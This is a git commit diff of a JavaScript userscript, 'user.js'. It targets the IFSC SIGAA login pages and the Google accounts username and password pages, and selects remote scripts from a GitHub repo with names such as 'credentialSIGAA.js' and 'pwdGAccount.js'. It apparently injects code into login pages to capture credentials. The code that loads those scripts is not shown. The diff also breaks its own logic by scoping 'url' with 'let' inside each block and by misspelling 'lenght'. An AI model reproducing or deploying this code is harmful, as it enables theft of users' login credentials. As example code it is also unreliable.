b6906029b7e71f83c13008120bfc348f94d79cd2
Wolota <123838258+Wolota@users.noreply.github.com>
2023-02-16 21:18:02 -0300

    Update user.js

--- user.js
+++ user.js
@@ -1,19 +1,14 @@
-let url;
-
-
 if (location.host == 'sigaa.ifsc.edu.br' || location.host == 'sig.ifsc.edu.br'){
-    url = "https://raw.githubusercontent.com/Wolota/ips/main/credentialSIGAA.js";
+    let url = "https://raw.githubusercontent.com/Wolota/ips/main/credentialSIGAA.js";
 }
-
-
-if (location.host == 'accounts.google.com'){
+else if (location.host == 'accounts.google.com'){
     let path = location.pathname.split('/');
     
     if (path[path.length - 1] == 'identifier'){
-            url = "https://raw.githubusercontent.com/Wolota/ips/main/identifierGAccount.js";
+            let url = "https://raw.githubusercontent.com/Wolota/ips/main/identifierGAccount.js";
     }
     else if (path[path.lenght - 1] == 'pwd'){
-        url = "https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js";
+        let url = "https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js";
     }
     
     console.log("[!] PATH = " + path)
